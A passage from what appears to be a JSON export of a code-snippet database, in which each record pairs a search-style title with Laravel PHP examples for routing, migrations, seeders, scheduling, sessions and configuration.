    "description": "Route::pattern('id', '[0-9]+'); Route::get('user/{id}', function ($id) {     // Only executed if {id} is numeric... });\nRoute::get('user/{id}', function ($id) {     return 'User '.$id; });\n# Using Request Route::get('user/{name}', function (Request $request) {     return $request->route('name'); });\nRoute::get('user/profile', [UserProfileController::class, 'show'])->name('profile');\nRoute::view('/welcome', 'welcome');  Route::view('/welcome', 'welcome', ['name' => 'Taylor']);\nRoute::get('posts/{post}/comments/{comment}', function ($postId, $commentId) {     // });\n",
    "reg_date": "2021-10-12T10:16:37.000Z"
  },
  {
    "id": 2642,
    "keyword": null,
    "link": null,
    "title": " laravel route resources",
    "description": "By default, Route::resource will create the route parameters for your resource routes based on the \"singularized\" version of the resource name. You can easily override this on a per resource  basis using the parameters method. The array passed into the parameters method should be an associative array of resource names and parameter names:  use App\\Http\\Controllers\\AdminUserController;  Route::resource('users', AdminUserController::class)->parameters([     'users' => 'admin_user' ]);\n// Implicit Model Binding Routes can be created with one line using either: Route::resource('photos', PhotoController::class); // OR Route::resources([ \t'photos' => PhotoController::class,     'posts' => PostController::class, ]);  php artisan make:controller PhotoController --resource --model=Photo   // makes a controller with stubouts for methods:   // index   // create   // store   // show   // edit   // update   // destroy \nBy default, all resource controller actions have a route name; however, you can override these names by passing a names array with your desired route names:  use App\\Http\\Controllers\\PhotoController;  Route::resource('photos', PhotoController::class)->names([     'create' => 'photos.build' ]);\nVerb          Path                        Action  Route Name GET           /users                      index   users.index GET           /users/create               create  users.create POST          /users                      store   users.store GET           /users/{user}               show    users.show GET           /users/{user}/edit          edit    users.edit PUT|PATCH     /users/{user}               update  users.update DELETE        /users/{user}               destroy users.destroy\nRoute::resource('faq', 'ProductFaqController', [     'names' => [         'index' => 'faq',         'store' => 'faq.new',         // etc...     ] ]);\n",
    "reg_date": "2021-10-12T10:16:37.000Z"
  },
  {
    "id": 2643,
    "keyword": null,
    "link": null,
    "title": " laravel route slug",
    "description": "use App\\Models\\Post;  Route::get('/posts/{post:slug}', function (Post $post) {     return $post; });\n",
    "reg_date": "2021-10-12T10:16:37.000Z"
  },
  {
    "id": 2644,
    "keyword": null,
    "link": null,
    "title": " laravel route with multiple parameters",
    "description": "route('routeName',['param1' => param1,'param2' => param2]);\nroute('memberHelper',['status'=>$statusId,'member'=>$memberId]); \nRoute::match(['get', 'post'], '/user', [     'uses' => 'AppController@user',     'as'   => 'useraccess',     'roles'=> 'HomeController@useroles',  ]);\n",
    "reg_date": "2021-10-12T10:16:37.000Z"
  },
  {
    "id": 2645,
    "keyword": null,
    "link": null,
    "title": " laravel routes resource",
    "description": "// Implicit Model Binding Routes can be created with one line using either: Route::resource('photos', PhotoController::class); // OR Route::resources([ \t'photos' => PhotoController::class,     'posts' => PostController::class, ]);  php artisan make:controller PhotoController --resource --model=Photo   // makes a controller with stubouts for methods:   // index   // create   // store   // show   // edit   // update   // destroy \nBy default, all resource controller actions have a route name; however, you can override these names by passing a names array with your desired route names:  use App\\Http\\Controllers\\PhotoController;  Route::resource('photos', PhotoController::class)->names([     'create' => 'photos.build' ]);\nVerb          Path                        Action  Route Name GET           /users                      index   users.index GET           /users/create               create  users.create POST          /users                      store   users.store GET           /users/{user}               show    users.show GET           /users/{user}/edit          edit    users.edit PUT|PATCH     /users/{user}               update  users.update DELETE        /users/{user}               destroy users.destroy\nRoute::resource('faq', 'ProductFaqController', [     'names' => [         'index' => 'faq',         'store' => 'faq.new',         // etc...     ] ]);\n",
    "reg_date": "2021-10-12T10:16:37.000Z"
  },
  {
    "id": 2646,
    "keyword": null,
    "link": null,
    "title": " laravel routes return view in web.php",
    "description": "Route::get(\"/page\", function(){    return View::make(\"dir.page\"); });\n",
    "reg_date": "2021-10-12T10:16:37.000Z"
  },
  {
    "id": 2647,
    "keyword": null,
    "link": null,
    "title": " laravel routing controller get and post method",
    "description": "Route::match(['GET', 'POST'], '/page-name', [App\\Http\\Controllers\\NameController::class, 'index']); \n",
    "reg_date": "2021-10-12T10:16:38.000Z"
  },
  {
    "id": 2648,
    "keyword": null,
    "link": null,
    "title": " laravel routing techniques",
    "description": "Route::view('Url','PageName'); //here Url is the call word which pass from url Route::get('Url',[Controller::class ,'FunctionName']); //from this route you can access function of specific  //controller thourgh specific url route Route::get('Url/{id}',[Controller::class ,'FunctionName']); //if you want to pass specific id or any thing thorugh route you  //can use it{id} or{name} or {anything} means anything you want to access \nRoute::get('user/{id}/profile', function ($id) {     // })->name('profile');  $url = route('profile', ['id' => 1, 'photos' => 'yes']);  // /user/1/profile?photos=yes\n",
    "reg_date": "2021-10-12T10:16:38.000Z"
  },
  {
    "id": 2649,
    "keyword": null,
    "link": null,
    "title": " laravel run php server by ipv4",
    "description": "php artisan serve --host 192.168.1.101 --port 80\n",
    "reg_date": "2021-10-12T10:16:38.000Z"
  },
  {
    "id": 2650,
    "keyword": null,
    "link": null,
    "title": " laravel run query after migration",
    "description": "//You should be able to add data to your new fields in your new migration. I'm not sure if it's the best way to go, but I've seen something like this before:  public function up() {     Schema::table('my_table', function (Blueprint $table) {         $table->string('my_column')->nullable();     });     $this->updateData(); }  private function updateData() {     $allCategories = Category::where('slug', null)->get();      foreach($allCategories as $singleCategory) {         $singleCategory->update([             'slug' => Category::makeSlug($singleCategory->name, $singleCategory->parent_id)         ]);     } }\nDB::statement(\"     CREATE TABLE `your_table` (         `id` int(10) unsigned NOT NULL AUTO_INCREMENT,         `status` tinyint(3) unsigned DEFAULT NULL,         PRIMARY KEY (`id`)       ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci; \");\n",
    "reg_date": "2021-10-12T10:16:38.000Z"
  },
  {
    "id": 2651,
    "keyword": null,
    "link": null,
    "title": " laravel run query migration",
    "description": "DB::statement(\"     CREATE TABLE `your_table` (         `id` int(10) unsigned NOT NULL AUTO_INCREMENT,         `status` tinyint(3) unsigned DEFAULT NULL,         PRIMARY KEY (`id`)       ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci; \");\n",
    "reg_date": "2021-10-12T10:16:38.000Z"
  },
  {
    "id": 2652,
    "keyword": null,
    "link": null,
    "title": " laravel run schedule only on production",
    "description": "php artisan schedule:list php artisan schedule:run\nif (App::environment('production')) {    $schedule->command('file:generate')          ->daily();    //run your commands here  }\n",
    "reg_date": "2021-10-12T10:16:38.000Z"
  },
  {
    "id": 2653,
    "keyword": null,
    "link": null,
    "title": " laravel run seed",
    "description": "#All of them php artisan db:seed #One class php artisan db:seed --class=UserSeeder\nphp artisan make:seeder NameOfTheSeeder\nphp artisan migrate:fresh --seed\nphp artisan make:seeder UsersTableSeeder\n<?php  use Illuminate\\Database\\Seeder; use Illuminate\\Support\\Facades\\DB; use Illuminate\\Support\\Facades\\Hash; use Illuminate\\Support\\Str;  class DatabaseSeeder extends Seeder {     /**      * Run the database seeds.      *      * @return void      */     public function run()     {         DB::table('users')->insert([             'name' => Str::random(10),             'email' => Str::random(10).'@gmail.com',             'password' => Hash::make('password'),         ]);     } }\n<?php  namespace Database\\Seeders;  use Illuminate\\Database\\Seeder; use Illuminate\\Support\\Facades\\DB; use Illuminate\\Support\\Facades\\Hash; use Illuminate\\Support\\Str;  class DatabaseSeeder extends Seeder {     /**      * Run the database seeders.      *      * @return void      */     public function run()     {         DB::table('users')->insert([             'name' => Str::random(10),             'email' => Str::random(10).'@gmail.com',             'password' => Hash::make('password'),         ]);     } }\n",
    "reg_date": "2021-10-12T10:16:38.000Z"
  },
  {
    "id": 2654,
    "keyword": null,
    "link": null,
    "title": " laravel run seeder",
    "description": "#All of them php artisan db:seed #One class php artisan db:seed --class=UserSeeder\nphp artisan db:seed --class=UserSeeder\nphp artisan make:seeder NameOfTheSeeder\nphp artisan migrate:fresh --seed\nphp artisan make:seeder UsersTableSeeder\n<?php  use Illuminate\\Database\\Seeder; use Illuminate\\Support\\Facades\\DB; use Illuminate\\Support\\Facades\\Hash; use Illuminate\\Support\\Str;  class DatabaseSeeder extends Seeder {     /**      * Run the database seeds.      *      * @return void      */     public function run()     {         DB::table('users')->insert([             'name' => Str::random(10),             'email' => Str::random(10).'@gmail.com',             'password' => Hash::make('password'),         ]);     } }\n",
    "reg_date": "2021-10-12T10:16:38.000Z"
  },
  {
    "id": 2655,
    "keyword": null,
    "link": null,
    "title": " laravel run single migration",
    "description": "php artisan migrate --path=/database/migrations/my_migration.php\nphp artisan migrate  --path=/database/migrations/selected\n* To run a specific migration  php artisan migrate:refresh --path=/database/migrations/2019_03_23_165757_create_combined_1553343771_users_table.php    - Note: it will drop the table and create a new one.  \n# If you would like to generate a database migration when you  # generate the model, you may use the --migration or -m option:  php artisan make:model Flight --migration php artisan make:model Flight -m\nphp artisan migrate:refresh  --path=/database/migrations/2014_10_12_000000_create_users_table.php\n",
    "reg_date": "2021-10-12T10:16:38.000Z"
  },
  {
    "id": 2656,
    "keyword": null,
    "link": null,
    "title": " laravel run test phpunit",
    "description": "vendor/bin/phpunit \n",
    "reg_date": "2021-10-12T10:16:38.000Z"
  },
  {
    "id": 2657,
    "keyword": null,
    "link": null,
    "title": " laravel running a specific migration on different path",
    "description": "php artisan migrate --path=/database/migrations/my_migration.php\nphp artisan migrate:refresh --path=/database/migrations/2021_06_23_093317_create_users_table.php\n* To run a specific migration  php artisan migrate:refresh --path=/database/migrations/2019_03_23_165757_create_combined_1553343771_users_table.php    - Note: it will drop the table and create a new one.  \n",
    "reg_date": "2021-10-12T10:16:38.000Z"
  },
  {
    "id": 2658,
    "keyword": null,
    "link": null,
    "title": " laravel s3 presigned url",
    "description": "$s3 = \\Storage::disk('s3'); $client = $s3->getDriver()->getAdapter()->getClient(); $expiry = \"+10 minutes\";  $command = $client->getCommand('GetObject', [     'Bucket' => \\Config::get('filesystems.disks.s3.bucket'),     'Key'    => \"file/in/s3/bucket\" ]);  $request = $client->createPresignedRequest($command, $expiry);  return (string) $request->getUri();\n",
    "reg_date": "2021-10-12T10:16:39.000Z"
  },
  {
    "id": 2659,
    "keyword": null,
    "link": null,
    "title": " laravel sail alias",
    "description": "/* So you can just run sail up  instead of: vendor/bin/sail up     (If you add -d to your command it runs in the background of the same terminal) Run this inside your project. Also this method does not carry over sessions */ alias sail=\"bash vendor/bin/sail\" sail up -d /* here is the official documentation for this  https://laravel.com/docs/8.x/sail#configuring-a-bash-alias */\n",
    "reg_date": "2021-10-12T10:16:39.000Z"
  },
  {
    "id": 2660,
    "keyword": null,
    "link": null,
    "title": " laravel sample controller",
    "description": "php artisan make:controller MyController\nphp artisan make:controller MyController php artisan make:controller CompanyController --resource //To create with a Model php artisan make:controller CompanyController --resource --model=CompanyModel \n",
    "reg_date": "2021-10-12T10:16:39.000Z"
  },
  {
    "id": 2661,
    "keyword": null,
    "link": null,
    "title": " laravel sanctum axios Unauthenticated",
    "description": "// open \"app/Http/Kernal.php\" // in \"protected $middlewareGroups\" // in \"api\" // uncomment this class: \\Laravel\\Sanctum\\Http\\Middleware\\EnsureFrontendRequestsAreStateful::class      \n",
    "reg_date": "2021-10-12T10:16:39.000Z"
  },
  {
    "id": 2662,
    "keyword": null,
    "link": null,
    "title": " laravel scaffolding",
    "description": "// Generate basic scaffolding... php artisan ui bootstrap php artisan ui vue php artisan ui react  // Generate login / registration scaffolding... php artisan ui bootstrap --auth php artisan ui vue --auth php artisan ui react --auth\n",
    "reg_date": "2021-10-12T10:16:39.000Z"
  },
  {
    "id": 2663,
    "keyword": null,
    "link": null,
    "title": " laravel scheduler every 2 hours",
    "description": "// App\\Console\\Kernel::schedule() $schedule->command('command')->cron('0 */2 * * *');\n",
    "reg_date": "2021-10-12T10:16:39.000Z"
  },
  {
    "id": 2664,
    "keyword": null,
    "link": null,
    "title": " laravel scheduler run",
    "description": "php artisan schedule:list php artisan schedule:run\nif (App::environment('production')) {    $schedule->command('file:generate')          ->daily();    //run your commands here  }\nSet the cron to run after every minute: * * * * * cd /path-to-your-project && php artisan schedule:run >> /dev/null 2>&1    Then inisde you kernel.php //For every minute $schedule->call(function () { \tLog::info('I ran after every 1 minute'); })->everyMinute(); //For every five minute $schedule->call(function () { \tLog::info('I ran after every 5 minute'); })->everyFiveMinutes();\n$schedule->call(function () {             DB::table('users')->whereYear('last_login_at','<',date('Y')-1)->delete();         })->daily();\n",
    "reg_date": "2021-10-12T10:16:39.000Z"
  },
  {
    "id": 2665,
    "keyword": null,
    "link": null,
    "title": " laravel schema default string length",
    "description": "use Illuminate\\Support\\Facades\\Schema;  public function boot() {     Schema::defaultStringLength(191); }\n",
    "reg_date": "2021-10-12T10:16:39.000Z"
  },
  {
    "id": 2666,
    "keyword": null,
    "link": null,
    "title": " laravel scout import command",
    "description": "php artisan scout:import \"App\\Models\\Post\" php artisan scout:flush \"App\\Models\\Post\"\n",
    "reg_date": "2021-10-12T10:16:39.000Z"
  },
  {
    "id": 2667,
    "keyword": null,
    "link": null,
    "title": " laravel search data relationship",
    "description": "$data = Subcategory::with([\"category\"])                             ->where('name','like', '%'.$this->searchData.'%')                             ->orWhereHas('category', function($query){$query->where('name', 'like', '%'.$this->searchData.'%');})                             ->orderBy($this->orderByData, $this->orderByAsc ? 'asc' : 'desc')                             ->paginate($this->showData);\n",
    "reg_date": "2021-10-12T10:16:40.000Z"
  },
  {
    "id": 2668,
    "keyword": null,
    "link": null,
    "title": " laravel search function",
    "description": "public function index(){       // // we need to show all data from \"blog\" table       // $blogs = Blog::all();       // // show data to our view       // return view('blog.index',['blogs' => $blogs]);        $search = Request::get('search');       $blogs = Blog::where('title','like','%'.$search.'%')->orderBy('id')->paginate(6);       return view('blog.index',['blogs' => $blogs]);     } \n                ->whereHas('translation', function ($query) use ($name){                     $query->where('name', 'like', $name);                 }, '>=', 10) \n$users = User::has('posts')->withCount('posts')->orderBy('posts_count')->take(50)->get();  $userIndex = $users->search(function($user) {     return $user->id === Auth::id(); });\n@extends('app')   @section('content')   <div class=\"form-group row add\">     <div class=\"col-md-6\">       <h1>Simple Laravel Ajax Crud</h1>     </div>     <div class=\"col-md-6\">       {!! Form::open(['method'=>'GET','url'=>'blog','class'=>'navbar-form navbar-left','role'=>'search']) !!}       <div class=\"input-group custom-search-form\">         <input type=\"text\" name=\"search\" class=\"form-control\" placeholder=\"Search ....\">         <span class=\"input-group-btn\">           <button type=\"submit\" class=\"btn btn-default-sm\">             <i class=\"fa fa-search\"></i>           </button>         </span>       </div>       {!! Form::close() !!}     </div>   </div>    <div class=\"form-group row add\">     <div class=\"col-md-5\">       <input type=\"text\" class=\"form-control\" id=\"title\" name=\"title\"       placeholder=\"Your title Here\" required>       <p class=\"error text-center alert alert-danger hidden\"></p>     </div>     <div class=\"col-md-5\">       <input type=\"text\" class=\"form-control\" id=\"description\" name=\"description\"       placeholder=\"Your description Here\" required>       <p class=\"error text-center alert alert-danger hidden\"></p>     </div>     <div class=\"col-md-2\">       <button class=\"btn btn-warning\" type=\"submit\" id=\"add\">         <span class=\"glyphicon glyphicon-plus\"></span> Add New Data       </button>     </div>   </div>    <div class=\"row\">     <div class=\"table-responsive\">       <table class=\"table table-borderless\" id=\"table\">         <tr>           <th>No.</th>           <th>Title</th>           <th>Description</th>           <th>Actions</th>         </tr>         {{ csrf_field() }}          <?php $no=1; ?>         @foreach($blogs as $blog)           <tr class=\"item{{$blog->id}}\">             <td>{{$no++}}</td>             <td>{{$blog->title}}</td>             <td>{{$blog->description}}</td>             <td>             <button class=\"edit-modal btn btn-primary\" data-id=\"{{$blog->id}}\" data-title=\"{{$blog->title}}\" data-description=\"{{$blog->description}}\">               <span class=\"glyphicon glyphicon-edit\"></span> Edit             </button>             <button class=\"delete-modal btn btn-danger\" data-id=\"{{$blog->id}}\" data-title=\"{{$blog->title}}\" data-description=\"{{$blog->description}}\">               <span class=\"glyphicon glyphicon-trash\"></span> Delete             </button>           </td>           </tr>         @endforeach       </table>       {!! $blogs->links() !!}     </div>   </div>   <div id=\"myModal\" class=\"modal fade\" role=\"dialog\">     <div class=\"modal-dialog\">       <div class=\"modal-content\">         <div class=\"modal-header\">           <button type=\"button\" class=\"close\" data-dismiss=\"modal\">&times;</button>             <h4 class=\"modal-title\"></h4>         </div>         <div class=\"modal-body\">           <form class=\"form-horizontal\" role=\"form\">             <div class=\"form-group\">               <label class=\"control-label col-sm-2\" for=\"id\">ID :</label>               <div class=\"col-sm-10\">                 <input type=\"text\" class=\"form-control\" id=\"fid\" disabled>               </div>               </div>               <div class=\"form-group\">               <label class=\"control-label col-sm-2\" for=\"title\">Title:</label>               <div class=\"col-sm-10\">                 <input type=\"name\" class=\"form-control\" id=\"t\">               </div>             </div>             <div class=\"form-group\">             <label class=\"control-label col-sm-2\" for=\"description\">Description:</label>             <div class=\"col-sm-10\">               <input type=\"name\" class=\"form-control\" id=\"d\">             </div>           </div>           </form>             <div class=\"deleteContent\">             Are you Sure you want to delete <span class=\"title\"></span> ?             <span class=\"hidden id\"></span>           </div>           <div class=\"modal-footer\">             <button type=\"button\" class=\"btn actionBtn\" data-dismiss=\"modal\">               <span id=\"footer_action_button\" class='glyphicon'> </span>             </button>             <button type=\"button\" class=\"btn btn-warning\" data-dismiss=\"modal\">               <span class='glyphicon glyphicon-remove'></span> Close             </button>           </div>         </div>       </div>     </div>   </div>   @stop \n",
    "reg_date": "2021-10-12T10:16:40.000Z"
  },
  {
    "id": 2669,
    "keyword": null,
    "link": null,
    "title": " laravel search inside array column",
    "description": "Solution1: ->whereJsonContains('user_id', 3)    Solution2: ->whereRaw(\"JSON_CONTAINS(user_id, '[3]' )\")    Solution3: ->where('user_id','like',\"%{$id}%\")   Solution4: Person::hasJob($job->id); // Inside Model public function scopeHasJob($query, $jobId) {     return $query->where('user_id', 'like', \"%\\\"{$userId}\\\"%\"); }  \n",
    "reg_date": "2021-10-12T10:16:40.000Z"
  },
  {
    "id": 2670,
    "keyword": null,
    "link": null,
    "title": " laravel seconds to hours minutes seconds",
    "description": "$value = '90060'; $dt = Carbon::now(); $days = $dt->diffInDays($dt->copy()->addSeconds($value)); $hours = $dt->diffInHours($dt->copy()->addSeconds($value)->subDays($days)); $minutes = $dt->diffInMinutes($dt->copy()->addSeconds($value)->subDays($days)->subHours($hours)); echo CarbonInterval::days($days)->hours($hours)->minutes($minutes)->forHumans();\n",
    "reg_date": "2021-10-12T10:16:40.000Z"
  },
  {
    "id": 2671,
    "keyword": null,
    "link": null,
    "title": " laravel seed fresh",
    "description": "#All of them php artisan db:seed #One class php artisan db:seed --class=UserSeeder\nphp artisan migrate:fresh --seed\nphp artisan make:seeder UsersTableSeeder\n<?php  namespace Database\\Seeders;  use Illuminate\\Database\\Seeder; use Illuminate\\Support\\Facades\\DB; use Illuminate\\Support\\Facades\\Hash; use Illuminate\\Support\\Str;  class DatabaseSeeder extends Seeder {     /**      * Run the database seeders.      *      * @return void      */     public function run()     {         DB::table('users')->insert([             'name' => Str::random(10),             'email' => Str::random(10).'@gmail.com',             'password' => Hash::make('password'),         ]);     } }\n",
    "reg_date": "2021-10-12T10:16:40.000Z"
  },
  {
    "id": 2672,
    "keyword": null,
    "link": null,
    "title": " laravel seed migrate",
    "description": "php artisan migrate:refresh --seed\nphp artisan make:model MODEL_PATH\\MODEL_NAME -ms    -m, --migration Create a new migration file for the model. -s, --seeder Create a new seeder file for the model.\nDB::table('translations')->where('field', 'page_desc')->update(['field' => 'meta_desc']); \n",
    "reg_date": "2021-10-12T10:16:40.000Z"
  },
  {
    "id": 2673,
    "keyword": null,
    "link": null,
    "title": " laravel seed specific file",
    "description": "php artisan db:seed --class=UserSeeder\nphp artisan make:seeder NameOfTheSeeder\nphp artisan migrate:fresh --seed\n<?php  use Illuminate\\Database\\Seeder; use Illuminate\\Support\\Facades\\DB; use Illuminate\\Support\\Facades\\Hash; use Illuminate\\Support\\Str;  class DatabaseSeeder extends Seeder {     /**      * Run the database seeds.      *      * @return void      */     public function run()     {         DB::table('users')->insert([             'name' => Str::random(10),             'email' => Str::random(10).'@gmail.com',             'password' => Hash::make('password'),         ]);     } }\n$ php artisan db:seed --class=ArticlesTableSeeder \n",
    "reg_date": "2021-10-12T10:16:40.000Z"
  },
  {
    "id": 2674,
    "keyword": null,
    "link": null,
    "title": " laravel seeder $this->command->info",
    "description": "#All of them php artisan db:seed #One class php artisan db:seed --class=UserSeeder\nphp artisan make:seeder NameOfTheSeeder\n<?php   //Test laravel 7.3 use App\\Models\\Eloquent\\DriversModel; use Illuminate\\Database\\Seeder;  class DriversSeeder extends Seeder {     /**      * Run the database seeds.      *      * @return void      */     public function run()     {         if (Schema::hasTable(\"drivers\")) {             // Nechta generatsiya qilish kerak bo`lsa belgilanadi default 10 tani tashkil qiladi             $count = (int)$this->command->ask('Necha dona Ustun qo`shishim kerak?', 10);             for ($i=1; $i < $count; $i++) {                 DriversModel::query()->updateOrCreate(['id' => $i], [                     'car_number' => ''.$i.'A365EA',                     'trailer_number' => 'a5s6d4321c2a6',                     'technical_passport' => 'asd56a5sa6f5',                     'full_name' => 'Akbarali'.$i.'',                     'passport' => '{\"0\": \"test'.$i.'.png\", \"1\": \"test1'.$i.'.png\"}',                     'license_limitation' => '6567965',                     'license' => '{\"0\": \"test'.$i.'.png\", \"1\": \"test1'.$i.'.png\"}',                     'rate' => '54546'.$i,                     'user_id' => '3',                 ]);                 $this->command->info(\"{$i} ustun qo'shildi.\");             }             $this->command->info(\"Jami {$i} ustun qo'shildi.\");         }     } } \nclass DatabaseSeeder extends Seeder {     public function run()     {         $this->call(ArticlesTableSeeder::class);         $this->call(UsersTableSeeder::class);     } } \n",
    "reg_date": "2021-10-12T10:16:40.000Z"
  },
  {
    "id": 2675,
    "keyword": null,
    "link": null,
    "title": " laravel seeder  assign a number",
    "description": "<?php //Laravel 7 tested use App\\Models\\Eloquent\\DriversModel; use Illuminate\\Database\\Seeder;  class DriversSeeder extends Seeder {     /**      * Run the database seeds.      *      * @return void      */     public function run()     {         if (Schema::hasTable(\"drivers\")) {             // Nechta generatsiya qilish kerak bo`lsa belgilanadi default 10 tani tashkil qiladi             $count = (int)$this->command->ask('Necha dona Ustun qo`shishim kerak?', 10);             for ($i=1; $i < $count; $i++) {                 DriversModel::query()->updateOrCreate(['id' => $i], [                     'car_number' => ''.$i.'A365EA',                     'trailer_number' => 'a5s6d4321c2a6',                     'technical_passport' => 'asd56a5sa6f5',                     'full_name' => 'Akbarali'.$i.'',                     'passport' => '{\"0\": \"test'.$i.'.png\", \"1\": \"test1'.$i.'.png\"}',                     'license_limitation' => '6567965',                     'license' => '{\"0\": \"test'.$i.'.png\", \"1\": \"test1'.$i.'.png\"}',                     'rate' => '54546'.$i,                     'user_id' => '3',                 ]);                 $this->command->info(\"{$i} ustun qo'shildi.\");             }             $this->command->info(\"Jami {$i} ustun qo'shildi.\");         }     } } \nclass UsersTableSeeder extends Seeder {     public function run()     {         $limit = env('SEEDER_LIMIT', 1);          echo $this->limit;     } }  //In terminal run: SEEDER_LIMIT=10 php artisan db:seed --class=UsersTableSeeder \n",
    "reg_date": "2021-10-12T10:16:40.000Z"
  },
  {
    "id": 2676,
    "keyword": null,
    "link": null,
    "title": " laravel select all except some columns",
    "description": "$patient_recommend_sms =PatientRecommendationSms:: where('patient_id' , $patient_id) ->get() ->makeHidden(['created_at','updated_at' ]);\n",
    "reg_date": "2021-10-12T10:16:40.000Z"
  },
  {
    "id": 2677,
    "keyword": null,
    "link": null,
    "title": " laravel select count",
    "description": "Sometime for such queries you need to disable the strict check  So inside config/database.php and inside mysql,   Set 'strict' => false,  ->select('user_id', DB::raw('SUM(points) as total_points'))\n$count = Model::where('status','=','1')->count();\n$users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\nDB::table('users')             ->where('name', '=', 'John')             ->where(function ($query) {                 $query->where('votes', '>', 100)                       ->orWhere('title', '=', 'Admin');             })             ->get();\n$users = DB::table('users')                     ->whereIn('id', [1, 2, 3])                     ->get();\n$count = DB::table('category_issue')->count();\n",
    "reg_date": "2021-10-12T10:16:41.000Z"
  },
  {
    "id": 2678,
    "keyword": null,
    "link": null,
    "title": " laravel select default old value",
    "description": "@foreach($services as $service) \t@if (old('category') == $service->id)   \t\t<option value=\"{{ $service->id }}\" selected>{{ $service->title }}</option>   \t@else \t\t<option value=\"{{ $service->id }}\">{{ $service->title }}</option> \t@endif @endforeach\n{{ old('title') == '1' ? 'selected' : '' }} <div class=\"form-group col-md-6\"> <label>Nationality {{$profiledata->nationality}}</label>    <select id=\"nationality\" required=\"\" name=\"nationality\" class=\"form-control\">     <option value=\"\">--Select--</option>     <option {{ ($profiledata->nationality) == 'United State' ? 'selected' : '' }}  value=\"United State\">United State</option>     <option {{ ($profiledata->nationality) == 'India' ? 'selected' : '' }}  value=\"India\">India</option>     <option {{ ($profiledata->nationality) == 'Canada' ? 'selected' : '' }}  value=\"Canada\">Canada</option>   </select> </div>\n<option value=\"{{ $key }}\" {{ (Input::old(\"title\") == $key ? \"selected\":\"\") }}>{{ $val }}</option> \n",
    "reg_date": "2021-10-12T10:16:41.000Z"
  },
  {
    "id": 2679,
    "keyword": null,
    "link": null,
    "title": " laravel select max value",
    "description": "Client::max('id')\nCliente::max('id')      or    $maxValue = Cliente::orderBy('id', 'desc')->value('id'); // gets only the id  \n",
    "reg_date": "2021-10-12T10:16:41.000Z"
  },
  {
    "id": 2680,
    "keyword": null,
    "link": null,
    "title": " laravel send post request from controller",
    "description": "use Illuminate\\Support\\Facades\\Http;  $response = Http::post('http://example.com/users', [     'name' => 'Steve',     'role' => 'Network Administrator', ]);  // By default, data will be sent using the application/json content type\n",
    "reg_date": "2021-10-12T10:16:41.000Z"
  },
  {
    "id": 2681,
    "keyword": null,
    "link": null,
    "title": " laravel serve Unknown: failed to open stream: No such file or directory in Unknown on line 0 [Wed Aug 18 15:55:47 2021] PHP Fatal error: Unknown: Failed opening required server.php",
    "description": "The problem was that the initial directory included server.php file and the second time around it was missing.  For me this was a weird interaction with Avast as it perceived the file as malicious. Check Avast's Virus chest to recover the file to avoid further issues.  Maybe this will save time for somebody.\n",
    "reg_date": "2021-10-12T10:16:41.000Z"
  },
  {
    "id": 2682,
    "keyword": null,
    "link": null,
    "title": " laravel server sent events",
    "description": "$loopTime = 1; $response = new StreamedResponse(static function () use ($loopTime) {     while (true) {       \t$data = [         \t'name' => 'Taylor Otwell'         ]              \techo \"event: sse\\n\";       \techo \"data: \" . json_encode($data) . \"\\n\\n\";         echo str_pad('', 4096) . \"\\n\";            \tob_flush();       \tflush();       \tsleep($loopTime);        \tif (connection_aborted()) {         \tbreak;       \t}     }     ob_end_flush(); }                                   $response->headers->set('Content-Type', 'text/event-stream'); $response->headers->set('Cache-Control', 'no-cache'); return $response;\n",
    "reg_date": "2021-10-12T10:16:41.000Z"
  },
  {
    "id": 2683,
    "keyword": null,
    "link": null,
    "title": " laravel session",
    "description": "/**   * Static method  */ Session::put('key', $value);\t// Set session variable Session::get('key')\t\t\t\t// Get session variable  /**  * Instance method  */ session(['key' => $value]);\t\t// Set session variable session('key');\t\t\t\t\t// Get session variable\nuse Illuminate\\Support\\Facades\\Session;  Session::flash('message','This is a message!');   then in your view::  @if(Session::has('message'))  <p class=\"alert {{ Session::get('alert-class', 'alert-info') }}\">{{Session::get('message') }}</p>  @endif\nSession::put('key', 'value');  session(['key' => 'value']);\nuse Illuminate\\Support\\Facades\\Session;\n// Via a request instance... $request->session()->put('key', 'value');  // Via the global \"session\" helper... session(['key' => 'value']);\n'for make session: syntax: session(key => value), ex. session('user1'=>'kinjal') session can remove using foreget() perticular user; syntax: session().forget(key); To delete all users from session: syntax: session()->flush();   To fetch all session data: syntax: session()->all();\n",
    "reg_date": "2021-10-12T10:16:41.000Z"
  },
  {
    "id": 2684,
    "keyword": null,
    "link": null,
    "title": " laravel session add array",
    "description": "// set products.name as array session()->put('products.name', []);   // somewhere later session()->push('products.name', $name1);  // somewhere else later session()->push('products.name', $name2); \n",
    "reg_date": "2021-10-12T10:16:41.000Z"
  },
  {
    "id": 2685,
    "keyword": null,
    "link": null,
    "title": " laravel session flash 2020",
    "description": "/**   * Static method  */ Session::put('key', $value);\t// Set session variable Session::get('key')\t\t\t\t// Get session variable  /**  * Instance method  */ session(['key' => $value]);\t\t// Set session variable session('key');\t\t\t\t\t// Get session variable\nuse Illuminate\\Support\\Facades\\Session;  Session::flash('message','This is a message!');   then in your view::  @if(Session::has('message'))  <p class=\"alert {{ Session::get('alert-class', 'alert-info') }}\">{{Session::get('message') }}</p>  @endif\n$request->session()->put('key','value'); \nsession(['name' => 'data']);\n",
    "reg_date": "2021-10-12T10:16:41.000Z"
  },
  {
    "id": 2686,
    "keyword": null,
    "link": null,
    "title": " laravel session put method",
    "description": "Session::put('key', 'value');  session(['key' => 'value']);\nSession::put('variableName', $value);\n",
    "reg_date": "2021-10-12T10:16:42.000Z"
  },
  {
    "id": 2687,
    "keyword": null,
    "link": null,
    "title": " laravel set appends",
    "description": "return $user->append('is_admin')->toArray();  return $user->setAppends(['is_admin'])->toArray();\n",
    "reg_date": "2021-10-12T10:16:42.000Z"
  },
  {
    "id": 2688,
    "keyword": null,
    "link": null,
    "title": " laravel set config",
    "description": "env('APP_URL')\nconfig()->set('config.path', $value);\nif (\\Illuminate\\Support\\Facades\\App::environment('production')) {     // The environment is production }\nuse Illuminate\\Support\\Facades\\Config;\n",
    "reg_date": "2021-10-12T10:16:42.000Z"
  },
  {
    "id": 2689,
    "keyword": null,
    "link": null,
    "title": " laravel set config value dynamically",
    "description": "Config::set('custom.my_val', 'mysinglelue'); \n",
    "reg_date": "2021-10-12T10:16:42.000Z"
  },
  {
